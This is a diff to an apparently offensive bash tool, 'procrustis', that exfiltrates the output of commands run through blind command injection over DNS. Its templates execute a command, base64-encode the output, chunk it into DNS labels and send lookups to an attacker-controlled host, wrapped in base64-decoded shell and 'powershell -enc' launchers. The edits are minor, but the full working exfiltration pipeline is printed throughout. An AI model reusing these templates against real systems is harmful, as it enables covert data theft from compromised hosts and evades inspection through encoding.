@@ -7,7 +7,7 @@ shell=bash #bash, sh or powershell
 strict_label_charset=1
 outfile=/dev/stdout
 timeout=10
-threads=5
+threads=10
 
 signature="---procrustis--"
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
@@ -28,7 +28,7 @@ Usage:
     -o FILE=stdout      The file where the command output will be stored
     -w SHELL=bash       Supported shells are bash, sh, powershell|ps
     -m TIMEOUT=10       Seconds after which the script exits when no new data are received
-    -t THREADS=10       Number of threads/processes to use when extracting the data
+    -t THREADS=10       Number of threads/processes to use when extracting the data (i.e. #DISPATCHER instances)
     -r                  No encoding of +/= characters before issuing dns requests
     -v                  Verbose mode
     
@@ -189,20 +189,20 @@ printf "Timeout: ${YELLOW}${timeout}${NC}\n"
 ##########sh definitions#######
 assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
 
-assign sh inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign sh inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+    assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
-#assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
+#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
 
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 
-assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
+    assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 }
-#assign bash inner_cmd_template "((${cmd});echo '%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."
+#assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$((RANDOM%10)) -eq 0 ]] && wait or sleep' ."
 
 ###########powershell definitions########
 assign powershell outer_cmd_template "powershell -enc %CMD_B64%"
@@ -270,7 +270,7 @@ while :;do
     fi
 done && echo
 
-output=$( (IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d)
+output=$((IFS=;echo "${all_chunks[*]}")|strict_translator -d|b64 -d)
 last_line=$(echo "$output"|tail -n1)
 echo "$output"|sed '$d' >> "$outfile"
 
